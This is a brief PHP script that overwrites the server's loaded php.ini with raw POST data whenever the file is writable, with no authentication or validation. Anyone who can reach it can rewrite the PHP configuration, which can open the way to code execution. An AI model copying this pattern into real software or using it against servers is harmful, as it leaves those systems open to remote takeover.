<?php
$ini_path = php_ini_loaded_file();

if ($_POST['ini_content'] && $ini_path && is_writable($ini_path)) {
    $result = file_put_contents($ini_path, $_POST['ini_content']);
    echo $result !== false ? 'success' : 'error: write failed.';
} else {
    echo 'Error: File not writable or no ini file is found.';
}